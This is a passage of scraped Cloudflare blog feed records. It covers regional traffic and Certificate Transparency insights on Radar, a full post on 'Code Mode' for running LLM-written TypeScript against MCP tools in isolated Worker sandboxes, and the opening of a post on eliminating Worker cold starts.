now have a new Traffic characteristics by region card that includes both summary and time series views of regional traffic. The summary view is presented as a map and table, similar to the Traffic characteristics card in the Worldwide traffic view. After selecting a metric from the dropdown at the top right of the card, the table and map are updated to reflect the relevant summary values for the chosen time period. Within the paginated table, the region names are linked, and clicking one will take you to the relevant page. Within the map, the summary values are represented by circles placed in the centroid of each region, sized in relation to their value. Clicking a circle will take you to the relevant page. Below the summary map and table, the card also includes a time series graph of traffic at a regional level for the top five highest traffic regions within the country. These graphs can reveal interesting regional differences in traffic patterns. For example, the Traffic volume by region in Iraq graph for HTTP request traffic shown below highlights the differing Internet shutdown schedules (Kurdistan Region, central and southern Iraq) across the different governorates. On days when the schedules do not overlap, such as September 2 and 7, traffic from the Erbil and Sulaymaniyah governorates, which are located in the Kurdistan Region, does not drop concurrent with the loss in traffic observed in Baghdad and Basra. Mobile vs. desktop device traffic trends Over the past several years, a number of Radar blog posts have explored how human activity impacts Internet traffic, including holiday celebrations, elections, and the Paris 2024 Summer Olympics. With the new regional views, this impact now becomes even clearer at a more local level. For instance, mobile devices account for, on average, just over half of the request traffic seen from Nairobi Country in Kenya. A clear diurnal pattern is seen on weekdays, where mobile device usage drops during workday hours, and then rises again in the evening. However, during the weekends, mobile traffic remains elevated, presumably due to fewer people using desktop computers in office environments, as well as fewer desktop computers in use at home, in line with Kenya’s mobile-first culture. Bot vs human traffic trends Similar to how the mobile vs. desktop view exposes shifts in human activity, bot vs. human traffic insights do as well. One interpretation of the graph below is that overnight bot activity from Lisbon increased significantly during the first few days of September. However, since the graph shows traffic shares, and given the timing of the apparent increases, the more likely cause is increasingly larger drops in human-driven traffic – users in Lisbon appear to begin logging off around 23:00 UTC (midnight local time), and start getting back online around 05:00 UTC (06:00 local time). The shares and shifts will obviously vary by country and region, but they can provide a perspective on the nocturnal habits of users in a region. Customize regional analysis with Radar’s Data Explorer Within the Data Explorer, you can use the breakdown options and filters to customize your analysis of regional traffic data.At a country level, choosing to breakdown by regions generates a stacked area graph that shows the relative traffic shares of the top 20 regions in the selected country, along with a bar graph showing summary share values. For example, the graph below shows that in aggregate, Virginia and California are responsible for just over a quarter of the HTTP request volume in the United States. You can also use Data Explorer to drill down on traffic at a network (ASN) level in a given region, in both summary and timeseries views. For example, looking at HTTP request traffic for Massachusetts by ASN, we can see that AS7922 (Comcast), accounts for a third, followed by AS701 (Verizon Fios, 15%), AS21928 (T-Mobile, 8.8%), AS6167 (Verizon Wireless, 5.1%), AS7018 (AT&T, 4.7%), and AS20115 (Charter/Spectrum, 4.5%). Over 70% of the request traffic is concentrated in these six providers, with nearly half of that from one provider. Going a level deeper, you can also look at traffic trends over time for an ASN within a given region, and even compare it with another time period. The graph below shows traffic for AS7922 (Comcast) in Massachusetts over a seven-day period, compared with the prior week. While the traffic volumes on most days were largely in line with the previous week, Saturday and Sunday were noticeably higher. These differences may reflect a shift in human activity, as September 6 & 7 were quite rainy in Massachusetts, so people may have spent more time indoors and online. (The prior weekend was Labor Day weekend, but those Saturday and Sunday traffic levels were in line with the preceding weekend.) You can also add another ASN to the traffic trends comparison. Selecting Massachusetts (Location) and AS701 (ASN) (Verizon Fios) in the Compare section finds that traffic on that network was higher on Saturday and Sunday as well, lending credence to the rainy weekend theory. Regional comparisons, whether within the same country or across different countries, are also possible in Data Explorer. For instance, if the Kansas City Chiefs and Philadelphia Eagles were to meet yet again in the Super Bowl, the configuration below could be used to compare traffic patterns in the teams’ respective home states, as well as comparing the trends with the previous week, showing how human activity impacted it over the course of the game. As always, the data powering the visualizations described above are also available through the Radar API. The timeseries_groups and summary methods for the NetFlows and HTTP endpoints now have an ADM1 dimension, allowing traffic to be broken down by first-order administrative divisions. In addition, the new geoId filter for the NetFlows and HTTP endpoints allows you to filter the results by a specific geolocation, using its GeoNames ID. And finally, there are new get and list endpoints for fetching geolocation details. A note regarding data quantity and quality As you’d expect, the more traffic we see from a given geography, the better the “signal”, and the clearer the associated graph is — this is generally the case when traffic is aggregated at a country level. However, for some smaller or less populous regions, especially in developing countries or countries with poor Internet connectivity, lower traffic will likely cause the signal to be weaker, resulting in graphs that appear spiky or incomplete. (Note that this will also be true for region+ASN views.) An illustrative example is shown below, for Northern Darfur State in Sudan. Traffic is observed somewhat inconsistently, resulting in the spikes seen in the graph. Similarly, the “Previous 7 days” line is largely incomplete, indicating a lack of traffic data for that period. In these cases, it will be hard to draw definitive conclusions from such graphs. Although the Internet arguably transcends geographical boundaries, the reality is that usage patterns can vary by location, with traffic trends that reflect more localized human activity. The new regional insights on Cloudflare Radar traffic pages, and in the Data Explorer, provide a perspective at a sub-national level. We are exploring the potential to go a level deeper in the future, providing traffic data for “second-order administrative divisions” (such as counties, cities, etc.).If you share our regional traffic graphs on social media, be sure to tag us: @CloudflareRadar (X), noc.social/@cloudflareradar (Mastodon), and radar.cloudflare.com (Bluesky). If you have questions or comments, you can reach out to us on social media, or contact us via email. Introducing Certificate Transparency insights on Radar Just as we're bringing more granular detail to traffic patterns, we're also shedding more light on the very foundation of trust on the Internet: TLS certificates. Certificate Authorities (CAs) serve as trusted gatekeepers for the Internet: any website that wants to prove its identity to clients must present a certificate issued by a CA that the client trusts. But how do we know that CAs themselves are trustworthy and only issue certificates they are authorized to issue?That’s where Certificate Transparency (CT) comes in. Clients that enforce CT (most major browsers) will only trust a website certificate if it is both signed by a trusted CA and has proof that the certificate has been added to a public, append-only CT log, so that it can be publicly audited. Only recently, CT played a key role in detecting the unauthorized issuance of certificates for 1.1.1.1, a public DNS resolver service that Cloudflare operates.In addition to its role as a vital safety mechanism for the Internet, CT has proven to be invaluable in other ways, as it provides publicly-accessible lists of all website certificates used on the Internet. This dataset is a treasure trove of intelligence for researchers measuring the Internet, security teams detecting malicious activity like phishing campaigns, or penetration testers mapping a target’s external attack surface.The sheer amount of data (multiple terabytes) available in CT makes it difficult for regular Internet users to download and explore themselves. Instead, services like crt.sh, Censys, and Merklemap provide easy search interfaces to allow discoverability for specific domain names and certificates. We launched Merkle Town in 2018 to share broad insights into the CT ecosystem using data from our own CT monitoring service.Certificate Transparency on Cloudflare Radar is the next evolution of Merkle Town, providing integration with security and domain information already on Radar and more interactive ways to explore and analyze CT data. (For long-time Merkle Town users, we’re keeping it around until we’ve reached full feature parity.)In the sections below, we’ll walk you through the features available in the new dashboard. Certificate volume and characteristics The CT page leads with a view of how many certificates are being issued and logged over time. Because the same certificate can appear multiple times within a single log or be submitted to several logs, the total count can be inflated. To address this, two distinct lines are shown: one for total entries and another for unique entries. Uniqueness, however, is calculated only within the selected time range — for example, if certificate C is added to log A in one period and to log B in another, it will appear in the unique count for both periods. It is also important to note that the CT charts and date filters use the log timestamp, which is the time a certificate was added to a CT log. Additionally, the data displayed on the page was collected from the logs monitored by Cloudflare — delays, backlogs, or other inconsistencies may exist, so please report any issues or discrepancies.Alongside this chart is a comparison between certificates and pre-certificates. A pre-certificate is a special type of certificate used in CT that allows a CA to publicly log a certificate before it is officially issued. CAs are not required to log full certificates if corresponding pre-certificates have already been logged (although many CAs do anyway), so typically there are more pre-certificates logged than full certificates, as seen in the chart. While certificate issuance trends are interesting on their own, analyzing the characteristics of issued certificates provides deeper insight into the state of the web’s trust infrastructure. Starting with the public key algorithm, which defines how secure connections are established between clients and servers, we found that more than 65% of certificates still use RSA, while the remainder use ECDSA. RSA remains dominant due to its long-standing compatibility with a wide range of clients, while ECDSA is increasingly adopted for its efficiency and smaller key sizes, which can improve performance and reduce computational overhead. In the coming years, we expect post-quantum signature algorithms like ML-DSA to appear when public CAs begin to offer support.Next, a breakdown of certificates by signature algorithm reveals how Certificate Authorities (CAs) sign the certificates they issue. Most certificates (over 65%) use RSA with SHA-256, followed by ECDSA with SHA-384 at 19%, ECDSA with SHA-256 at 12%, and a small fraction using other algorithms. The choice of signature algorithm reflects a balance between widespread support, security, and performance, with stronger algorithms like ECDSA gradually gaining traction for modern deployments.Certificates are also categorized by validation level, which reflects the degree to which the CA has verified the identity of the certificate requester. The main validation types are Domain Validation (DV), Organization Validation (OV), and Extended Validation (EV). DV certificates verify only control of the domain, OV certificates verify both domain control and the organization behind it, and EV certificates involve more rigorous checks and display additional identity information in browsers. The industry trend is toward simpler, automated issuance, with DV certificates now making up almost 98% of issued certificates, while EV issuance has become largely obsolete. Finally, the chart on certificate duration shows the difference between the NotBefore and NotAfter dates embedded in each certificate, which define the period during which the certificate is valid. Currently, the majority (92%) of issued certificates have durations between 47 and 100 days. Shorter certificate lifetimes improve security by limiting exposure if a certificate is compromised, and the industry is moving toward even shorter durations, driven by browser policies and automated renewal systems. Certificate issuance Certificate issuance is the process by which CAs generate certificates for domain owners. Many CAs are operated by larger organizations that manage multiple subordinate CAs under a single corporate umbrella. The CT page highlights the distribution of certificate issuance across the top CA owners. At the moment, the Internet Security Research Group (ISRG), also known as Let’s Encrypt, issues more than 66% of all certificates, followed by other widely used CA owners including Google Trust Services, Sectigo, and GoDaddy. The impact of events like the July 21-22 Let’s Encrypt API outage due to internal DNS failures that significantly reduced certificate issuance rates are visible in this visualization, as issuance rates dropped significantly during the two-day period. In addition to CA owners, the page provides a breakdown of certificate issuance by individual CA certificates. Among the top five CAs, Let’s Encrypt’s four intermediate CAs — R12, R13, E7, and E8 — represent the bulk of its issuance. The bar chart can also be filtered by CA owner to display only the certificates associated with a specified organization. The CT section also offers dedicated CA-specific pages. By searching for a CA name or fingerprint in the top search bar, you can reach a page showing all insights and trends available on the main CT page, filtered by the selected CA. The page also includes an additional CA information card, which provides details such as the CA’s owner, revocation status, parent certificate, validity period, country, inclusion in public root stores, and a list of all CAs operated by the same owner. All of this information is derived from the Common CA Database (CCADB). Certificate Transparency logs Next on the CT page is a section focused on CT logs. This section shows the distribution of certificates across CT log operators, identifying the organizations that manage the infrastructure behind the logs. Over the last three months, Sectigo operated the logs containing the largest number of certificates (2.8 billion), followed by Google (2.5 billion), Cloudflare (1.6 billion), and Let’s Encrypt (1.4 billion). Note that the same certificate can be logged multiple times across CT logs, so organizations that operate multiple CT logs with overlapping acceptance criteria may log certificates at an elevated rate. As such, the relative rank of the operators in this graph should not be construed as a measure of how load-bearing the logs are within the ecosystem. Below this, a bar chart displays the distribution of certificates across individual CT logs. Among the top five logs are Google’s xenon2025h1 and argon2025h2, Cloudflare’s nimbus2025, and Let’s Encrypt’s oak2025h2. This chart can also be filtered by operator to show only the logs associated with a specific owner. Next to the chart, another view shows the distribution of certificates by log API, distinguishing between logs following the original RFC 6962 API versus those compatible with the newer and more efficient static CT API. Similar to the dedicated CA pages, the CT section also provides log-specific pages. By searching for a log name in the top search bar, you can access a page showing all insights and trends available on the main CT page, filtered by the selected log. Two additional cards are included: one showing information about the log, derived from Google Chrome’s log list, including details such as the operator, API type, documentation, and a list of other logs operated by the same organization; and another displaying performance metrics with two radar charts tracking uptime and response time over the past 90 days, as observed by Cloudflare’s CT monitor. These metrics are useful to determine if logs are meeting the ongoing requirements for inclusion in CT programs like Google's. Certificate coverage Last but not least, the CT page includes a section on certificate coverage. Certificates can cover multiple top-level domains (TLDs), include wildcard entries, and support IP addresses in Subject Alternative Names (SANs).The distribution of pre-certificates across the top 10 TLDs highlights the domains most commonly covered. .com leads with 45% of certificates, followed by other popular TLDs such as .dev and .net.Next to this view, two half-donut charts provide further insights into certificate coverage: one shows the share of certificates that include wildcard entries — almost 25% of certificates use wildcards to cover multiple subdomains — while the other shows certificates that include IP addresses, revealing that the vast majority of certificates do not contain IPs in their SAN fields Expanded domain certificate data The domain information page has also been updated to provide richer details about certificates. The certificates table, which displays certificates recorded in active CT logs for the specified domain, now includes expandable rows. Expanding a row reveals further information, including the certificate’s SHA-256 fingerprint, subject and issuer details — Common Name (CN), Organization (O), and Country (C) — the validity period (NotBefore and NotAfter), and the CT log where the certificate was found. While the charts above highlight key insights in the CT ecosystem, all underlying data is accessible via the API and can be explored interactively across time periods, CAs, logs, and additional filters and dimensions using Radar’s Data Explorer. And as always, Radar charts and graphs can be downloaded for sharing or embedded directly into blogs, websites, and dashboards for further analysis. Don’t hesitate to reach out to us with feedback, suggestions, and feature requests — we’re already working through a list of early feedback from the CT community! Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. Birthday WeekRadarInternet TrafficMobileCertificate Transparency\nSeptember 30, 2025 10:05 AMNationwide Internet shutdown in Afghanistan extends localized disruptionsOn September 29, 2025, Internet connectivity was completely shut down across Afghanistan, impacting business, education, finance, and government services....By David BelsonRadar, Internet Shutdown, Internet Traffic, Outage\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 2:00 PMCloudflare just got faster and more secure, powered by RustWe’ve replaced the original core system in Cloudflare with a new modular Rust-based proxy, replacing NGINX. ...By Richard Boulton, Steve Goldsmith, Maurizio Abba, Matthew BullockBirthday Week, Rust, NGINX, Deep Dive, Engineering\nSeptember 26, 2025 2:00 PMMonitoring AS-SETs and why they matterWe will cover some of the reasons why operators need to monitor the AS-SET memberships for their ASN, and now Cloudflare Radar can help. ...By Mingwei Zhang, Bryton HerdesBGP, RPKI, Birthday Week, Cloudflare Network, Radar", "timestamp": "2025-10-21T13:33:40.580540"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Code Mode: the better way to use MCP", "url": "https://blog.cloudflare.com/code-mode/", "published": "Fri, 26 Sep 2025 13:00:00 GMT", "content": "Code Mode: the better way to use MCP2025-09-26Kenton VardaSunil Pai9 min readIt turns out we've all been using MCP wrong.Most agents today use MCP by directly exposing the \"tools\" to the LLM.We tried something different: Convert the MCP tools into a TypeScript API, and then ask an LLM to write code that calls that API.The results are striking:We found agents are able to handle many more tools, and more complex tools, when those tools are presented as a TypeScript API rather than directly. Perhaps this is because LLMs have an enormous amount of real-world TypeScript in their training set, but only a small set of contrived examples of tool calls.The approach really shines when an agent needs to string together multiple calls. With the traditional approach, the output of each tool call must feed into the LLM's neural network, just to be copied over to the inputs of the next call, wasting time, energy, and tokens. When the LLM can write code, it can skip all that, and only read back the final results it needs.In short, LLMs are better at writing code to call MCP, than at calling MCP directly. What's MCP? For those that aren't familiar: Model Context Protocol is a standard protocol for giving AI agents access to external tools, so that they can directly perform work, rather than just chat with you.Seen another way, MCP is a uniform way to:expose an API for doing something,along with documentation needed for an LLM to understand it,with authorization handled out-of-band.MCP has been making waves throughout 2025 as it has suddenly greatly expanded the capabilities of AI agents.The \"API\" exposed by an MCP server is expressed as a set of \"tools\". Each tool is essentially a remote procedure call (RPC) function – it is called with some parameters and returns a response. Most modern LLMs have the capability to use \"tools\" (sometimes called \"function calling\"), meaning they are trained to output text in a certain format when they want to invoke a tool. The program invoking the LLM sees this format and invokes the tool as specified, then feeds the results back into the LLM as input. Anatomy of a tool call Under the hood, an LLM generates a stream of \"tokens\" representing its output. A token might represent a word, a syllable, some sort of punctuation, or some other component of text.A tool call, though, involves a token that does not have any textual equivalent. The LLM is trained (or, more often, fine-tuned) to understand a special token that it can output that means \"the following should be interpreted as a tool call,\" and another special token that means \"this is the end of the tool call.\" Between these two tokens, the LLM will typically write tokens corresponding to some sort of JSON message that describes the call.For instance, imagine you have connected an agent to an MCP server that provides weather info, and you then ask the agent what the weather is like in Austin, TX. Under the hood, the LLM might generate output like the following. Note that here we've used words in <| and |> to represent our special tokens, but in fact, these tokens do not represent text at all; this is just for illustration.I will use the Weather MCP server to find out the weather in Austin, TX. I will use the Weather MCP server to find out the weather in Austin, TX. <|tool_call|> { \"name\": \"get_current_weather\", \"arguments\": { \"location\": \"Austin, TX, USA\" } } <|end_tool_call|> Upon seeing these special tokens in the output, the LLM's harness will interpret the sequence as a tool call. After seeing the end token, the harness pauses execution of the LLM. It parses the JSON message and returns it as a separate component of the structured API result. The agent calling the LLM API sees the tool call, invokes the relevant MCP server, and then sends the results back to the LLM API. The LLM's harness will then use another set of special tokens to feed the result back into the LLM: <|tool_result|> { \"location\": \"Austin, TX, USA\", \"temperature\": 93, \"unit\": \"fahrenheit\", \"conditions\": \"sunny\" } <|end_tool_result|> The LLM reads these tokens in exactly the same way it would read input from the user – except that the user cannot produce these special tokens, so the LLM knows it is the result of the tool call. The LLM then continues generating output like normal.Different LLMs may use different formats for tool calling, but this is the basic idea. What's wrong with this? The special tokens used in tool calls are things LLMs have never seen in the wild. They must be specially trained to use tools, based on synthetic training data. They aren't always that good at it. If you present an LLM with too many tools, or overly complex tools, it may struggle to choose the right one or to use it correctly. As a result, MCP server designers are encouraged to present greatly simplified APIs as compared to the more traditional API they might expose to developers.Meanwhile, LLMs are getting really good at writing code. In fact, LLMs asked to write code against the full, complex APIs normally exposed to developers don't seem to have too much trouble with it. Why, then, do MCP interfaces have to \"dumb it down\"? Writing code and calling tools are almost the same thing, but it seems like LLMs can do one much better than the other?The answer is simple: LLMs have seen a lot of code. They have not seen a lot of \"tool calls\". In fact, the tool calls they have seen are probably limited to a contrived training set constructed by the LLM's own developers, in order to try to train it. Whereas they have seen real-world code from millions of open source projects.Making an LLM perform tasks with tool calling is like putting Shakespeare through a month-long class in Mandarin and then asking him to write a play in it. It's just not going to be his best work. But MCP is still useful, because it is uniform MCP is designed for tool-calling, but it doesn't actually have to be used that way.The \"tools\" that an MCP server exposes are really just an RPC interface with attached documentation. We don't really have to present them as tools. We can take the tools, and turn them into a programming language API instead.But why would we do that, when the programming language APIs already exist independently? Almost every MCP server is just a wrapper around an existing traditional API – why not expose those APIs?Well, it turns out MCP does something else that's really useful: It provides a uniform way to connect to and learn about an API.An AI agent can use an MCP server even if the agent's developers never heard of the particular MCP server, and the MCP server's developers never heard of the particular agent. This has rarely been true of traditional APIs in the past. Usually, the client developer always knows exactly what API they are coding for. As a result, every API is able to do things like basic connectivity, authorization, and documentation a little bit differently.This uniformity is useful even when the AI agent is writing code. We'd like the AI agent to run in a sandbox such that it can only access the tools we give it. MCP makes it possible for the agentic framework to implement this, by handling connectivity and authorization in a standard way, independent of the AI code. We also don't want the AI to have to search the Internet for documentation; MCP provides it directly in the protocol. OK, how does it work? We have already extended the Cloudflare Agents SDK to support this new model!For example, say you have an app built with ai-sdk that looks like this: const stream = streamText({ model: openai(\"gpt-5\"), system: \"You are a helpful assistant\", messages: [ { role: \"user\", content: \"Write a function that adds two numbers\" } ], tools: { // tool definitions } }) You can wrap the tools and prompt with the codemode helper, and use them in your app: import { codemode } from \"agents/codemode/ai\"; const {system, tools} = codemode({ system: \"You are a helpful assistant\", tools: { // tool definitions }, // ...config }) const stream = streamText({ model: openai(\"gpt-5\"), system, tools, messages: [ { role: \"user\", content: \"Write a function that adds two numbers\" } ] }) With this change, your app will now start generating and running code that itself will make calls to the tools you defined, MCP servers included. We will introduce variants for other libraries in the very near future. Read the docs for more details and examples. Converting MCP to TypeScript When you connect to an MCP server in \"code mode\", the Agents SDK will fetch the MCP server's schema, and then convert it into a TypeScript API, complete with doc comments based on the schema.For example, connecting to the MCP server at https://gitmcp.io/cloudflare/agents, will generate a TypeScript definition like this: interface FetchAgentsDocumentationInput { [k: string]: unknown; } interface FetchAgentsDocumentationOutput { [key: string]: any; } interface SearchAgentsDocumentationInput { /** * The search query to find relevant documentation */ query: string; } interface SearchAgentsDocumentationOutput { [key: string]: any; } interface SearchAgentsCodeInput { /** * The search query to find relevant code files */ query: string; /** * Page number to retrieve (starting from 1). Each page contains 30 * results. */ page?: number; } interface SearchAgentsCodeOutput { [key: string]: any; } interface FetchGenericUrlContentInput { /** * The URL of the document or page to fetch */ url: string; } interface FetchGenericUrlContentOutput { [key: string]: any; } declare const codemode: { /** * Fetch entire documentation file from GitHub repository: * cloudflare/agents. Useful for general questions. Always call * this tool first if asked about cloudflare/agents. */ fetch_agents_documentation: ( input: FetchAgentsDocumentationInput ) => Promise<FetchAgentsDocumentationOutput>; /** * Semantically search within the fetched documentation from * GitHub repository: cloudflare/agents. Useful for specific queries. */ search_agents_documentation: ( input: SearchAgentsDocumentationInput ) => Promise<SearchAgentsDocumentationOutput>; /** * Search for code within the GitHub repository: \"cloudflare/agents\" * using the GitHub Search API (exact match). Returns matching files * for you to query further if relevant. */ search_agents_code: ( input: SearchAgentsCodeInput ) => Promise<SearchAgentsCodeOutput>; /** * Generic tool to fetch content from any absolute URL, respecting * robots.txt rules. Use this to retrieve referenced urls (absolute * urls) that were mentioned in previously fetched documentation. */ fetch_generic_url_content: ( input: FetchGenericUrlContentInput ) => Promise<FetchGenericUrlContentOutput>; }; This TypeScript is then loaded into the agent's context. Currently, the entire API is loaded, but future improvements could allow an agent to search and browse the API more dynamically – much like an agentic coding assistant would. Running code in a sandbox Instead of being presented with all the tools of all the connected MCP servers, our agent is presented with just one tool, which simply executes some TypeScript code.The code is then executed in a secure sandbox. The sandbox is totally isolated from the Internet. Its only access to the outside world is through the TypeScript APIs representing its connected MCP servers.These APIs are backed by RPC invocation which calls back to the agent loop. There, the Agents SDK dispatches the call to the appropriate MCP server.The sandboxed code returns results to the agent in the obvious way: by invoking console.log(). When the script finishes, all the output logs are passed back to the agent. Dynamic Worker loading: no containers here This new approach requires access to a secure sandbox where arbitrary code can run. So where do we find one? Do we have to run containers? Is that expensive?No. There are no containers. We have something much better: isolates.The Cloudflare Workers platform has always been based on V8 isolates, that is, isolated JavaScript runtimes powered by the V8 JavaScript engine.Isolates are far more lightweight than containers. An isolate can start in a handful of milliseconds using only a few megabytes of memory.Isolates are so fast that we can just create a new one for every piece of code the agent runs. There's no need to reuse them. There's no need to prewarm them. Just create it, on demand, run the code, and throw it away. It all happens so fast that the overhead is negligible; it's almost as if you were just eval()ing the code directly. But with security. The Worker Loader API Until now, though, there was no way for a Worker to directly load an isolate containing arbitrary code. All Worker code instead had to be uploaded via the Cloudflare API, which would then deploy it globally, so that it could run anywhere. That's not what we want for Agents! We want the code to just run right where the agent is.To that end, we've added a new API to the Workers platform: the Worker Loader API. With it, you can load Worker code on-demand. Here's what it looks like: // Gets the Worker with the given ID, creating it if no such Worker exists yet. let worker = env.LOADER.get(id, async () => { // If the Worker does not already exist, this callback is invoked to fetch // its code. return { compatibilityDate: \"2025-06-01\", // Specify the worker's code (module files). mainModule: \"foo.js\", modules: { \"foo.js\": \"export default {\\n\" + \" fetch(req, env, ctx) { return new Response('Hello'); }\\n\" + \"}\\n\", }, // Specify the dynamic Worker's environment (`env`). env: { // It can contain basic serializable data types... SOME_NUMBER: 123, // ... and bindings back to the parent worker's exported RPC // interfaces, using the new `ctx.exports` loopback bindings API. SOME_RPC_BINDING: ctx.exports.MyBindingImpl({props}) }, // Redirect the Worker's `fetch()` and `connect()` to proxy through // the parent worker, to monitor or filter all Internet access. You // can also block Internet access completely by passing `null`. globalOutbound: ctx.exports.OutboundProxy({props}), }; }); // Now you can get the Worker's entrypoint and send requests to it. let defaultEntrypoint = worker.getEntrypoint(); await defaultEntrypoint.fetch(\"http://example.com\"); // You can get non-default entrypoints as well, and specify the // `ctx.props` value to be delivered to the entrypoint. let someEntrypoint = worker.getEntrypoint(\"SomeEntrypointClass\", { props: {someProp: 123} }); You can start playing with this API right now when running workerd locally with Wrangler (check out the docs), and you can sign up for beta access to use it in production. Workers are better sandboxes The design of Workers makes it unusually good at sandboxing, especially for this use case, for a few reasons: Faster, cheaper, disposable sandboxes The Workers platform uses isolates instead of containers. Isolates are much lighter-weight and faster to start up. It takes mere milliseconds to start a fresh isolate, and it's so cheap we can just create a new one for every single code snippet the agent generates. There's no need to worry about pooling isolates for reuse, prewarming, etc.We have not yet finalized pricing for the Worker Loader API, but because it is based on isolates, we will be able to offer it at a significantly lower cost than container-based solutions. Isolated by default, but connected with bindings Workers are just better at handling isolation.In Code Mode, we prohibit the sandboxed worker from talking to the Internet. The global fetch() and connect() functions throw errors.But on most platforms, this would be a problem. On most platforms, the way you get access to private resources is, you start with general network access. Then, using that network access, you send requests to specific services, passing them some sort of API key to authorize private access.But Workers has always had a better answer. In Workers, the \"environment\" (env object) doesn't just contain strings, it contains live objects, also known as \"bindings\". These objects can provide direct access to private resources without involving generic network requests.In Code Mode, we give the sandbox access to bindings representing the MCP servers it is connected to. Thus, the agent can specifically access those MCP servers without having network access in general.Limiting access via bindings is much cleaner than doing it via, say, network-level filtering or HTTP proxies. Filtering is hard on both the LLM and the supervisor, because the boundaries are often unclear: the supervisor may have a hard time identifying exactly what traffic is legitimately necessary to talk to an API. Meanwhile, the LLM may have difficulty guessing what kinds of requests will be blocked. With the bindings approach, it's well-defined: the binding provides a JavaScript interface, and that interface is allowed to be used. It's just better this way. No API keys to leak An additional benefit of bindings is that they hide API keys. The binding itself provides an already-authorized client interface to the MCP server. All calls made on it go to the agent supervisor first, which holds the access tokens and adds them into requests sent on to MCP.This means that the AI cannot possibly write code that leaks any keys, solving a common security problem seen in AI-authored code today. Try it now! Sign up for the production beta The Dynamic Worker Loader API is in closed beta. To use it in production, sign up today. Or try it locally If you just want to play around, though, Dynamic Worker Loading is fully available today when developing locally with Wrangler and workerd – check out the docs for Dynamic Worker Loading and code mode in the Agents SDK to get started.Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. AIBirthday WeekCloudflare WorkersAgentsMCP\nOctober 14, 2025 8:00 PMUnpacking Cloudflare Workers CPU Performance BenchmarksCloudflare investigated CPU performance benchmark results for Workers, uncovering and fixing issues in infrastructure, V8 garbage collection, and OpenNext optimizations. ...By Kenton VardaCloudflare Workers, Developer Platform, Developers\nSeptember 30, 2025 3:50 PMPayload on Workers: a full-fledged CMS, running entirely on Cloudflare’s stackWe demonstrate how the open-source Payload CMS was ported to run entirely on Cloudflare's developer platform....By Jason Kincaid, Ricardo TavaresCloudflare Workers\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 2:00 PMMonitoring AS-SETs and why they matterWe will cover some of the reasons why operators need to monitor the AS-SET memberships for their ASN, and now Cloudflare Radar can help. ...By Mingwei Zhang, Bryton HerdesBGP, RPKI, Birthday Week, Cloudflare Network, Radar", "timestamp": "2025-10-21T13:33:41.405543"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Eliminating Cold Starts 2: shard and conquer", "url": "https://blog.cloudflare.com/eliminating-cold-starts-2-shard-and-conquer/", "published": "Fri, 26 Sep 2025 13:00:00 GMT", "content": "Eliminating Cold Starts 2: shard and conquer2025-09-26Harris Hancock15 min readFive years ago, we announced that we were Eliminating Cold Starts with Cloudflare Workers. In that episode, we introduced a technique to pre-warm Workers during the TLS handshake of their first request. That technique takes advantage of the fact that the TLS Server Name Indication (SNI) is sent in the very first message of the TLS handshake. Armed with that SNI, we often have enough information to pre-warm the request’s target Worker.Eliminating cold starts by pre-warming Workers during TLS handshakes was a huge step forward for us, but “eliminate” is a strong word. Back then, Workers were still relatively small, and had cold starts constrained by limits explained later in this post. We’ve relaxed those limits, and users routinely deploy complex applications on Workers, often replacing origin servers. Simultaneously, TLS handshakes haven’t gotten any slower. In fact, TLS 1.3 only requires a single round trip for a handshake – compared to three round trips for TLS 1.2 – and is more widely used than it was in 2021.Earlier this month, we finished deploying a new technique intended to keep pushing the boundary on cold start reduction. The new technique (or old, depending on your perspective) uses a consistent hash ring to take advantage of our global network. We call this mechanism “Worker sharding”. What’s in a cold start? A Worker is the basic unit of compute in our serverless computing platform. It has a simple lifecycle. We instantiate it from source code (typically JavaScript), make it serve a bunch of requests (often HTTP, but not always), and eventually shut it down some time after it stops receiving traffic, to re-use its resources for other Workers. We call that shutdown process “eviction”.The most expensive part of the Worker’s lifecycle is the initial instantiation and first request invocation. We call this part a “cold start”. Cold starts have several phases: fetching the script source code, compiling the source code, performing a top-level execution of the resulting JavaScript module, and finally, performing the initial invocation to serve the incoming HTTP request that triggered the whole sequence of events in the first place. Cold starts have become longer than TLS handshakes Fundamentally, our TLS handshake technique depends on the handshake lasting longer than the cold start. This is because the duration of the TLS handshake is time that the visitor must spend waiting, regardless, so it’s beneficial to everyone if we do as much work during that time as possible. If we can run the Worker’s cold start in the background while the handshake is still taking place, and if that cold start finishes before the handshake, then the request will ultimately see zero cold start delay. If, on the other hand, the cold start takes longer than the TLS handshake, then the request will see some part of the cold start delay – though the technique still helps reduce that visible delay. In the early days, TLS handshakes lasting longer than Worker cold starts was a safe bet, and cold starts typically won the race. One of our early blog posts explaining how our platform works mentions 5 millisecond cold start times – and that was correct, at the time!For every limit we have, our users have challenged us to relax them. Cold start times are no different. There are two crucial limits which affect cold start time: Worker script size and the startup CPU time limit. While we didn’t make big announcements at the time, we have quietly raised both of those 